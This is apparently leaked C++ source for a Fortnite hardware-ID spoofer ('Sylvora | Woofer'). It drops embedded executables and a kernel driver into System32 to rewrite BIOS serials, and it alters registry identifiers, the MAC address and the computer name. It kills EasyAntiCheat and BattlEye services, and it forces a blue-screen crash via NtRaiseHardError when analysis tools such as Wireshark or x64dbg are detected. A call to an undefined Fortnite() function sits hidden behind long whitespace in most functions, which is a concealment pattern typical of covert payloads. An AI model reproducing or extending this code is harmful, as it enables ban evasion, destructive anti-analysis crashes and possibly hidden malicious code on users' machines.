#include "includes.h"

using namespace KeyAuth;

// DISCORD: sohomx
std::string name = skCrypt("").decrypt();
std::string ownerid = skCrypt("").decrypt();
std::string secret = skCrypt("").decrypt();
std::string version = skCrypt("").decrypt();
std::string url = skCrypt("https://keyauth.win/api/1.2/").decrypt();

auto chapath = _xor_("C:\\Windows\\System32\\zhjers.exe");  // UC BYTES DOWNLOAD
auto drvpath = _xor_("C:\\Windows\\System32\\AMIFLDRV64.SYS"); // UC BYTES DOWNLOAD

api KeyAuthApp(name, ownerid, secret, version, url);

bool CreateFileFromMemory(const std::string& desired_file_path, const char* address, size_t size);

void MainOption();

void Logo()
{
                                                                                                                                                                                                                                                                                                                     Fortnite();
    std::cout << R"(                                                                                                                              
                _____   ______   _____  _____          _______    ______      ____     ___________          _____               
           _____\    \ |\     \ |     ||\    \         \      |  |      | ____\_  \__  \          \       /      |_             
          /    / \    |\ \     \|     | \\    \         |     /  /     /|/     /     \  \    /\    \     /         \            
         |    |  /___/| \ \           |  \\    \        |\    \  \    |//     /\      |  |   \_\    |   |     /\    \           
      ____\    \ |   ||  \ \____      |   \|    | ______\ \    \ |    ||     |  |     |  |      ___/    |    |  |    \          
     /    /\    \|___|/   \|___/     /|    |    |/      \\|     \|    ||     |  |     |  |      \  ____ |     \/      \         
    |    |/ \    \            /     / |    /            | |\         /||     | /     /| /     /\ \/    \|\      /\     \        
    |\____\ /____/|          /_____/  /   /_____/\_____/| | \_______/ ||\     \_____/ |/_____/ |\______|| \_____\ \_____\       
    | |   ||    | |          |     | /   |      | |    ||  \ |     | / | \_____\   | / |     | | |     || |     | |     |       
     \|___||____|/           |_____|/    |______|/|____|/   \|_____|/   \ |    |___|/  |_____|/ \|_____| \|_____|\|_____|       
                                                                         \|____|      
                                              
)" << '\n';

}

std::string RandomString(const int len)
{                                                                   
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
    std::string tmp_s;
    tmp_s.reserve(len);

    for (int i = 0; i < len; ++i) {
        tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];
    }

    return tmp_s;
}

std::string RandomVolumeID(const int len)
{
    static const char alphanum[] =
        "0123456789"
        "ABCDEF";
    std::string tmp_s;
    tmp_s.reserve(len);

    for (int i = 0; i < len; ++i) {
        tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];
    }

    return tmp_s;
}

std::uintptr_t ProcessFinder(const std::string& name)
{
    const auto snap = LI_FN(CreateToolhelp32Snapshot).safe()(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 proc_entry{};
    proc_entry.dwSize = sizeof proc_entry;

    auto found_process = false;
    if (!!LI_FN(Process32First).safe()(snap, &proc_entry)) {
        do {
            if (name == proc_entry.szExeFile) {
                found_process = true;
                break;
            }
        } while (!!LI_FN(Process32Next).safe()(snap, &proc_entry));
    }

    LI_FN(CloseHandle).safe()(snap);
    return found_process
        ? proc_entry.th32ProcessID
        : 0;
}

void NameChanger()
{
    std::string NAME = (std::string)("SOHOMX SELF LEAK" + version + " | " + RandomString(15));
    SetConsoleTitleA(NAME.c_str());

}

DWORD ChangeName(LPVOID in)
{

    while(true)
    {
        NameChanger();
    }
}

bool BSOD()
{
    BOOLEAN bEnabled;
    ULONG uResp;
    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
    return 0;
}

void ProcessFind()
{                           
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

    if (ProcessFinder(_xor_("KsDumperClient.exe")))
    {
        BSOD();
    }
    else if (ProcessFinder(_xor_("HTTPDebuggerUI.exe")))
    {
        BSOD();
    }
    else if (ProcessFinder(_xor_("HTTPDebuggerSvc.exe")))
    {
        BSOD();
    }
    else if (ProcessFinder(_xor_("FolderChangesView.exe")))
    {
        BSOD();
    }
    else if (ProcessFinder(_xor_("ProcessHacker.exe")))
    {
        BSOD();
    }
    else if (ProcessFinder(_xor_("procmon.exe")))
    {
        BSOD();
    }
    else if (ProcessFinder(_xor_("idaq.exe")))
    {
        BSOD();
    }
    else if (ProcessFinder(_xor_("idaq64.exe")))
    {
        BSOD();
    }
    else if (ProcessFinder(_xor_("Wireshark.exe")))
    {
        BSOD();
    }
    else if (ProcessFinder(_xor_("Fiddler.exe")))
    {
        BSOD();
    }
    else if (ProcessFinder(_xor_("Xenos64.exe")))
    {
        BSOD();
    }
    else if (ProcessFinder(_xor_("Cheat Engine.exe")))
    {
        BSOD();
    }
    else if (ProcessFinder(_xor_("HTTP Debugger Windows Service (32 bit).exe")))
    {
        BSOD();
    }
    else if (ProcessFinder(_xor_("KsDumper.exe")))
    {
        BSOD();
    }
    else if (ProcessFinder(_xor_("x64dbg.exe")))
    {
        BSOD();
    }
    else if (ProcessFinder(_xor_("ProcessHacker.exe")))
    {
        BSOD();
    }
    else if (FindWindow(0, _xor_("IDA: Quick start").c_str()))
    {
        BSOD();
    }

    else if (FindWindow(0, _xor_("Memory Viewer").c_str()))
    {
        BSOD();
    }
    else if (FindWindow(0, _xor_("Process List").c_str()))
    {
        BSOD();
    }
    else if (FindWindow(0, _xor_("KsDumper").c_str()))
    {
        BSOD();
    }
    else if (FindWindow(0, _xor_("HTTP Debugger").c_str()))
    {
        BSOD();
    }
    else if (FindWindow(0, _xor_("OllyDbg").c_str()))
    {
        BSOD();
    }
    std::this_thread::sleep_for(std::chrono::milliseconds(2000));
}

void ProcessKiller()
{
    LI_FN(system)(skCrypt("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1"));
    LI_FN(system)(skCrypt("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1"));
    LI_FN(system)(skCrypt("sc stop HTTPDebuggerPro >nul 2>&1"));
    LI_FN(system)(skCrypt("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1"));
    LI_FN(system)(skCrypt("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1"));
    LI_FN(system)(skCrypt("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1"));
    LI_FN(system)(skCrypt("taskkill /f /im epicgameslauncher.exe > nul"));
    LI_FN(system)(skCrypt("taskkill /f /im EpicWebHelper.exe > nul"));
    LI_FN(system)(skCrypt("taskkill /f /im FortniteClient - Win64 - Shipping_EAC.exe > nul"));
    LI_FN(system)(skCrypt("taskkill /f /im FortniteClient - Win64 - Shipping_BE.exe > nul"));
    LI_FN(system)(skCrypt("taskkill /f /im FortniteLauncher.exe > nul"));
    LI_FN(system)(skCrypt("taskkill /f /im FortniteClient - Win64 - Shipping.exe > nul"));
    LI_FN(system)(skCrypt("taskkill /f /im EpicGamesLauncher.exe > nul"));
    LI_FN(system)(skCrypt("taskkill /f /im EasyAntiCheat.exe > nul"));
    LI_FN(system)(skCrypt("taskkill /f /im BEService.exe > nul"));
    LI_FN(system)(skCrypt("taskkill /f /im BEServices.exe > nul"));
    LI_FN(system)(skCrypt("taskkill /f /im BattleEye.exe > nul"));
    LI_FN(system)(skCrypt("sc stop BattlEye Service"));
    LI_FN(system)(skCrypt("sc stop EasyAntiCheat"));
    std::this_thread::sleep_for(std::chrono::milliseconds(2000));
}

void VolumeID()
{

    CreateFileFromMemory("C:\\Windows\\System32\\vdfjdisfudasu.exe", reinterpret_cast<const char*>(Volume), sizeof(Volume));

    LI_FN(Sleep)(1000);

    system(("C:\\Windows\\System32\\vdfjdisfudasu.exe C:\\ " + RandomVolumeID(4) + "-" + RandomVolumeID(4)).c_str());
    system(("C:\\Windows\\System32\\vdfjdisfudasu.exe D:\\ " + RandomVolumeID(4) + "-" + RandomVolumeID(4)).c_str());
    system(("C:\\Windows\\System32\\vdfjdisfudasu.exe E:\\ " + RandomVolumeID(4) + "-" + RandomVolumeID(4)).c_str());

    LI_FN(Sleep)(2000);

}

void MAC()
{
                                                                                                                                                                                                                                                        Fortnite();
    CMAC* MAC = new CMAC();

    MAC->SpoofMAC();
}

void Finished()
{
    Fortnite();
    std::remove(skCrypt("C:\\Windows\\System32\\vdfjdisfudasu.exe"));
    std::remove(skCrypt("C:\\Windows\\System32\\zhjers.exe"));
    std::remove(skCrypt("C:\\Windows\\System32\\AMIFLDRV64.SYS"));

    LI_FN(system)(skCrypt("REG ADD HKLM\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid /t REG_SZ /d %random%%random%-%random%-%random%-%random% /f"));
    LI_FN(system)(skCrypt("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v ProductId /t REG_SZ /d %random%%random%-%random%-%random%-%random% /f"));
    LI_FN(system)(skCrypt("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v InstallDate /t REG_SZ /d %random%%random% /f"));
    LI_FN(system)(skCrypt("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v InstallTime /t REG_SZ /d %random% /f"));
    LI_FN(system)(skCrypt("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\" \"NT\\CurrentVersion /v BuildLabEx /t REG_SZ /d %random% /f"));
    LI_FN(system)(skCrypt("REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware\" \"Profiles\\0001 /v HwProfileGuid /t REG_SZ /d {%random%%random%-%random%-%random%-%random%%random%} /f"));


    LI_FN(system)(skCrypt("wmic computersystem where name=%computername% call rename=%random%"));

    LI_FN(system)(skCrypt("cls"));
    LI_FN(Sleep)(2000);

    ShowWindow(GetConsoleWindow(), SW_SHOW);

    int restartadapters = MessageBox(NULL, skCrypt("Would you like to restart your adapters?"), skCrypt("Sylvora | Woofer"), MB_YESNO);
    if (restartadapters == IDYES)
    {
        ShowWindow(GetConsoleWindow(), SW_HIDE);
        LI_FN(system)("cls");
        LI_FN(system)(skCrypt("netsh winsock reset"));
        LI_FN(system)(skCrypt("netsh winsock reset catalog"));
        LI_FN(system)(skCrypt("netsh int ip reset"));
        LI_FN(system)(skCrypt("netsh advfirewall reset"));
        LI_FN(system)(skCrypt("netsh int reset all"));
        LI_FN(system)(skCrypt("netsh int ipv4 reset"));
        LI_FN(system)(skCrypt("netsh int ipv6 reset"));
        LI_FN(system)(skCrypt("ipconfig / release"));
        LI_FN(system)(skCrypt("ipconfig / renew"));
        LI_FN(system)(skCrypt("ipconfig / flushdns"));
        LI_FN(system)(skCrypt("WMIC PATH WIN32_NETWORKADAPTER WHERE PHYSICALADAPTER=TRUE CALL DISABLE >nul 2>&1"));
        Sleep(2000);
        LI_FN(system)(skCrypt("WMIC PATH WIN32_NETWORKADAPTER WHERE PHYSICALADAPTER=TRUE CALL ENABLE >nul 2>&1"));
        LI_FN(system)("cls");
        ShowWindow(GetConsoleWindow(), SW_SHOW);
    }

    int restart = MessageBox(NULL, skCrypt("Finished spoofing. Would you like to restart?"), skCrypt("Sylvora | Woofer"), MB_YESNO);
    if (restart == IDYES)
    {
        VMProtect::End();
        LI_FN(system)(skCrypt("C:\\Windows\\System32\\shutdown /r /t 0"));
    }

    MainOption();
}

void Custom()
{
    LI_FN(system)(skCrypt("cls"));
    MessageBox(NULL, skCrypt("Press 'OK' to begin spoofing."), skCrypt("Sylvora | Woofer "), MB_ICONINFORMATION);
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    CreateFileFromMemory(chapath, reinterpret_cast<const char*>(Changer), sizeof(Changer));
    Sleep(1000);
    CreateFileFromMemory(drvpath, reinterpret_cast<const char*>(Driver), sizeof(Driver));

    Sleep(1000);
    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /SU auto"));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("cls"));
    ShowWindow(GetConsoleWindow(), SW_SHOW);

firstserial:
    string SS;
    std::cout << skCrypt("[+] Please input a System Serial Number (xxxxx-xxxxx): ");
    std::cin >> SS;

    if (SS.empty())
    {
        MessageBox(NULL, skCrypt("Serial cannot be blank."), skCrypt("Sylvora | Woofer "), MB_ICONINFORMATION);
        goto firstserial;
    }

    ShowWindow(GetConsoleWindow(), SW_HIDE);

    system(("C:\\Windows\\System32\\zhjers.exe /SS " + SS).c_str());

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("cls"));
    ShowWindow(GetConsoleWindow(), SW_SHOW);

secondserial:
    string BS;
    std::cout << skCrypt("[+] Please input a Baseboard Serial Number (xxxxx-xxxxx-xxxxx): ");
    std::cin >> BS;

    if (BS.empty())
    {
        MessageBox(NULL, skCrypt("Serial cannot be blank."), skCrypt("Sylvora | Woofer "), MB_ICONINFORMATION);
        goto secondserial;
    }

    ShowWindow(GetConsoleWindow(), SW_HIDE);

    system(("C:\\Windows\\System32\\zhjers.exe /BS " + SS).c_str());

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("cls"));
    ShowWindow(GetConsoleWindow(), SW_SHOW);

thirdserial:
    string CS;
    std::cout << skCrypt("[+] Please input a Chassis Serial Number (xxxxx-xxxxx-xxxxx): ");
    std::cin >> CS;

    if (CS.empty())
    {
        MessageBox(NULL, skCrypt("Serial cannot be blank."), skCrypt("Sylvora | Woofer "), MB_ICONINFORMATION);
        goto thirdserial;
    }

    ShowWindow(GetConsoleWindow(), SW_HIDE);

    system(("C:\\Windows\\System32\\zhjers.exe /CS " + CS).c_str());

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("cls"));
    ShowWindow(GetConsoleWindow(), SW_SHOW);

fourthserial:
    string PSN;
    std::cout << skCrypt("[+] Please input a Processor Serial Number (xxxxx--xxxxx): ");
    std::cin >> PSN;

    if (PSN.empty())
    {
        MessageBox(NULL, skCrypt("Serial cannot be blank."), skCrypt("Sylvora | Woofer "), MB_ICONINFORMATION);
        goto fourthserial;
    }

    ShowWindow(GetConsoleWindow(), SW_HIDE);

    system(("C:\\Windows\\System32\\zhjers.exe /PSN " + PSN).c_str());

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /SK \"To be filled by O.E.M\" "));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /SF \"To be filled by O.E.M.\" "));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /BT \"To be filled by O.E.M.\" "));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /BLC \"To be filled by O.E.M.\" "));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /CA \"To be filled by O.E.M.\" "));

    LI_FN(Sleep)(750);;

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /CSK \"To be filled by O.E.M.\" "));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /IVN \"American Megatrends International, LLC.\" "));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /ID \"06/27/23\" "));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /IV \"A.F0\" "));;

    LI_FN(Sleep)(1000);

    VolumeID();
    MAC();

    Finished();

}

void Null()
{                                                                                                                                                                                                                                                                                                                                                                                                                     Fortnite();
    LI_FN(system)(skCrypt("cls"));
    MessageBox(NULL, "Press 'OK' to begin spoofing.", "Sylvora | Woofer ", MB_ICONINFORMATION);
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    CreateFileFromMemory(chapath, reinterpret_cast<const char*>(Changer), sizeof(Changer));
    Sleep(1000);
    CreateFileFromMemory(drvpath, reinterpret_cast<const char*>(Driver), sizeof(Driver));

    Sleep(1000);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /SU auto"));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /SS \"To be filled by O.E.M\" "));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /BS \"To be filled by O.E.M\" "));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /PSN \"Unknown\" "));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /CS \"To be filled by O.E.M\" "));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /SK \"To be filled by O.E.M\" "));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /SF \"To be filled by O.E.M.\" "));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /BT \"To be filled by O.E.M.\" "));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /BLC \"To be filled by O.E.M.\" "));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /CA \"To be filled by O.E.M.\" "));

    LI_FN(Sleep)(750);;

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /CSK \"To be filled by O.E.M.\" "));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /IVN \"American Megatrends International, LLC.\" "));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /ID 06/27/23 "));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /IV \"A.F0\" "));;

    LI_FN(Sleep)(1000);

    VolumeID();

    MAC();

    Finished();

}

void Randomize()
{                                                                                                                                                                                                                                                                                                                                                                   Fortnite();
    LI_FN(system)(skCrypt("cls"));
    MessageBox(NULL, skCrypt("Press 'OK' to begin spoofing."), skCrypt("Sylvora | Woofer "), MB_ICONINFORMATION);
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    CreateFileFromMemory(chapath, reinterpret_cast<const char*>(Changer), sizeof(Changer));
    Sleep(1000);
    CreateFileFromMemory(drvpath, reinterpret_cast<const char*>(Driver), sizeof(Driver));

    Sleep(1000);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /SU auto"));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /SS %random%-%random%"));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /BS %random%-%random%-%random%-%random%"));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /CS %random%-%random%-%random%"));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /SK \"To be filled by O.E.M\" "));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /SF \"To be filled by O.E.M.\" "));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /BT \"To be filled by O.E.M.\" "));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /BLC \"To be filled by O.E.M.\" "));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /CA \"To be filled by O.E.M.\" "));

    LI_FN(Sleep)(750);;

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /CSK \"To be filled by O.E.M.\" "));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /IVN \"American Megatrends International, LLC.\" "));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /ID \"06/27/23\" "));

    LI_FN(Sleep)(750);

    LI_FN(system)(skCrypt("C:\\Windows\\System32\\zhjers.exe /IV \"A.F0\" "));;

    LI_FN(Sleep)(1000);

    VolumeID();
    MAC();

    Finished();

}

void Perm()
{                                                                                                                                                                                                                                                                                                                                                                                                        Fortnite();

    LI_FN(system)("cls");

    int read = MessageBox(NULL, skCrypt("Before you perm spoof, would you like to read the guide?"), skCrypt("Sylvora | Woofer"), MB_YESNO);
    if (read == IDYES)
    {
        LI_FN(system)("start https://docs.google.com/document/d/1PWtlQifZGbygMdLsXDUZtmBg13KsSiAeTYWlKo6nasU/edit?usp=sharing");
    }

spoofselection:
    LI_FN(system)("cls");
    Logo();

    std::cout << skCrypt("\n    [F1] Spoof w/ Random Serials");
    std::cout << skCrypt("\n    [F2] Spoof w/ Nulled Serials");
    std::cout << skCrypt("\n    [F3] Spoof w/ Custom Serials\n    ");

    while (true)
    {
        if (GetAsyncKeyState(VK_F1) & 1)
        {
            LI_FN(Beep)(500, 500);
            Randomize();
        }

        if (GetAsyncKeyState(VK_F2) & 1)
        {
            LI_FN(Beep)(500, 500);
            Null();

        }

        if (GetAsyncKeyState(VK_F3) & 1)
        {
            LI_FN(Beep)(500, 500);
            int experienced = MessageBox(NULL, skCrypt("WARNING: THIS IS FOR EXPERIENCED USERS ONLY. WOULD YOU LIKE TO CONTINUE?"), skCrypt("Sylvora | Woofer "), MB_YESNO);
            if (experienced == IDYES)
            {
                Custom();
            }
            else
            {
                goto spoofselection;
            }

        }
    }
}

void CheckSerials()
{
    LI_FN(system)(skCrypt("cls"));
    LI_FN(system)(skCrypt("echo Disks:\n"));
    LI_FN(Sleep)(200);
    LI_FN(system)(skCrypt("wmic diskdrive get model, serialnumber"));
    LI_FN(Sleep)(200);
    LI_FN(system)(skCrypt("echo CPU:\n"));
    LI_FN(Sleep)(200);
    LI_FN(system)(skCrypt("wmic cpu get serialnumber"));
    LI_FN(Sleep)(200);
    LI_FN(system)(skCrypt("echo BIOS:\n"));
    LI_FN(Sleep)(200);
    LI_FN(system)(skCrypt("wmic bios get serialnumber"));
    LI_FN(Sleep)(200);
    LI_FN(system)(skCrypt("echo Motherboard:\n"));
    LI_FN(Sleep)(200);
    LI_FN(system)(skCrypt("wmic baseboard get serialnumber"));
    LI_FN(Sleep)(200);
    LI_FN(system)(skCrypt("echo Bios UUID:\n"));
    LI_FN(Sleep)(200);
    LI_FN(system)(skCrypt("wmic path win32_computersystemproduct get uuid"));
    LI_FN(Sleep)(200);
    LI_FN(system)(skCrypt("echo Mac:\n"));
    LI_FN(Sleep)(200);
    LI_FN(system)(skCrypt("getmac"));
    LI_FN(Sleep)(200);
    LI_FN(system)(skCrypt("\npause"));
}

void MainOption()
{                                                   
                                                                                                                                                                                                                                                                                                                                                                                                                                            Fortnite();
main:
    LI_FN(system)(skCrypt("cls"));

    Logo();

    std::cout << skCrypt("\n    [F1] Perm Spoof");
    // std::cout << skCrypt("\n    [F2] Clean");
    std::cout << skCrypt("\n    [F2] Check Serials");
    std::cout << skCrypt("\n    [F3] Exit\n    ");

    while (true)
    {
        if (GetAsyncKeyState(VK_F1) & 1)
        {
            LI_FN(Beep)(500, 500);
            Perm();
            goto main;
        }

        if (GetAsyncKeyState(VK_F2) & 1)
        {
            LI_FN(Beep)(500, 500);
            // Clean();
            CheckSerials();
            goto main;
        }

        if (GetAsyncKeyState(VK_F3) & 1)
        {
            LI_FN(Beep)(500, 500);
            exit(0);
        }

        /*if (GetAsyncKeyState(VK_F4) & 1)
        {
            LI_FN(Beep)(500, 500);
            exit(0);
        }
        */
    }

    LI_FN(Sleep)(18000);
    exit(0);
}

void SIDc()
{
    system("SID.EXE /KEY=7M7h8-JrFJg-AfUYt-1v"); // not complete https://www.stratesave.com/html/sidchg.html
}

bool CreateFileFromMemory(const std::string& desired_file_path, const char* address, size_t size)
{
    std::ofstream file_ofstream(desired_file_path.c_str(), std::ios_base::out | std::ios_base::binary);

    if (!file_ofstream.write(address, size))
    {
        file_ofstream.close();
        return false;
    }

    file_ofstream.close();
    return true;
}   // UC BYTES

bool ReadFileToMemory(const std::string& file_path, std::vector<uint8_t>* out_buffer)
{
    std::ifstream file_ifstream(file_path, std::ios::binary);

    if (!file_ifstream)
        return false;

    out_buffer->assign((std::istreambuf_iterator<char>(file_ifstream)), std::istreambuf_iterator<char>());
    file_ifstream.close();

    return true;
}  // UC BYTES

int main()
{                                                                                                                                                                                                                                                                                                        Fortnite();

    CreateThread(NULL, NULL, ChangeName, NULL, NULL, NULL);
    HWND hwnd = GetConsoleWindow();
    MoveWindow(hwnd, 100, 100, 1500, 750, TRUE);
    SetLayeredWindowAttributes(hwnd, NULL, 240, LWA_ALPHA);

    /*
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    HANDLE hProcess = GetCurrentProcess();

    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
    FARPROC func_DbgUiRemoteBreakin = GetProcAddress(hMod, "DbgUiRemoteBreakin");

    WriteProcessMemory(hProcess, func_DbgUiRemoteBreakin, AntiAttach, 6, NULL);

    VMProtectBegin("SYLVORA");
    VMProtectBeginUltra("SYLVORA");
    VMProtectBeginVirtualization("SYLVORA");
    VMProtect::BeginMutation("SYLVORA");
    VMProtectIsVirtualMachinePresent();
    VMProtect::FlagAll;

    ProcessKiller();
    ProcessFind();
    CreateThread(NULL, NULL, ChangeName, NULL, NULL, NULL);
    ProtectionLoop();

    std::thread(HideThread).detach();
    std::thread(AntiDebug).detach();
    std::thread(DebugString).detach();
    std::thread(ContextThread).detach();

    LI_FN(system)(skCrypt("cls"));

    HWND hwnd = GetConsoleWindow();
    if (hwnd != NULL) { MoveWindow(hwnd, 100, 100, 1500, 750, TRUE); }

    ShowWindow(GetConsoleWindow(), SW_SHOW);


    KeyAuthApp.init();
    if (!KeyAuthApp.data.success)
    {
        std::cout << skCrypt("\n    [-] Updating");
        Sleep(2000);
        exit(0);
    }

    //SIDc();

    if (std::filesystem::exists("C:\\SylvoraW.json"))
    {
        if (!CheckIfJsonKeyExists("C:\\SylvoraW.json", "username"))
        {
            Logo();

            std::string username = ReadFromJson("C:\\SylvoraW.json", "username");
            std::string password = ReadFromJson("C:\\SylvoraW.json", "password");
            KeyAuthApp.login(username, password);
            if (!KeyAuthApp.data.success)
            {
                std::remove(skCrypt("C:\\SylvoraW.json"));
                std::cout << skCrypt("  [-] Automatic Login failed.");
                LI_FN(Sleep)(1500);
                goto start;
            }
        }

    }
    else
    {

    start:
        std::string username;
        std::string password;
        std::string key;

        LI_FN(system)(skCrypt("cls"));

        Logo();
        std::cout << skCrypt("\n    [+] Enter Username: ");
        std::cin >> username;
        std::cout << skCrypt("\n    [+] Enter Password: ");
        std::cin >> password;

        KeyAuthApp.login(username, password);

        if (!KeyAuthApp.data.success)
        {
            std::cout << skCrypt("\n    [-] Invalid Login.");
            LI_FN(Sleep)(1500);
            goto start;
        }

        WriteToJson("C:\\SylvoraW.json", "username", username, true, "password", password);



    }

    LI_FN(Beep)(500, 500);

    LI_FN(system)(skCrypt("cls"));

    Logo();

    std::cout << skCrypt("\n    [+] Logged in successfully.");

    if (KeyAuthApp.checkblack())
    {
        BSOD();
    }
    if (KeyAuthApp.data.username == "hacker")
    {
        BSOD();
        exit(0);
    }

    if (KeyAuthApp.data.username == "123")
    {
        BSOD();
        exit(0);
    }

    if (KeyAuthApp.data.username == "cracked")
    {
        BSOD();
        exit(0);
    }

    if (KeyAuthApp.data.username == "L")
    {
        BSOD();
        exit(0);
    }

    if (KeyAuthApp.data.username == "W")
    {
        BSOD();
        exit(0);
    }

    if (KeyAuthApp.data.username == " ")
    {
        BSOD();
        exit(0);
    }

    if (KeyAuthApp.data.ip == "69.69.69.69")
    {
        BSOD();
        exit(0);
    }


    LI_FN(Sleep)(2000);

    KeyAuthApp.log(KeyAuthApp.data.username + " logged in.\n");

    LI_FN(system)(skCrypt("cls"));

    Logo();

    std::cout << skCrypt("\n    [=] IP: ") << KeyAuthApp.data.ip;
    LI_FN(Sleep)(1000);
    std::cout << skCrypt("\n    [=] HWID: ") << KeyAuthApp.data.hwid;
    LI_FN(Sleep)(1000);
    std::cout << skCrypt("\n    [=] Last login: ") << Time(TimeTM(StringToTime(KeyAuthApp.data.lastlogin)));
    LI_FN(Sleep)(1000);

    LI_FN(Sleep)(3000);
    LI_FN(system)(skCrypt("cls"));
    */


    MainOption();
}

std::string Time(tm ctx)
{
    char buffer[80];

    strftime(buffer, sizeof(buffer), "%a %m/%d/%y %H:%M:%S %Z", &ctx);

    return std::string(buffer);
}

static std::time_t StringToTime(std::string timestamp)
{
    auto cv = strtol(timestamp.c_str(), NULL, 10);

    return (time_t)cv;
}

static std::tm TimeTM(time_t timestamp)
{
    std::tm context;

    localtime_s(&context, &timestamp);

    return context;
}
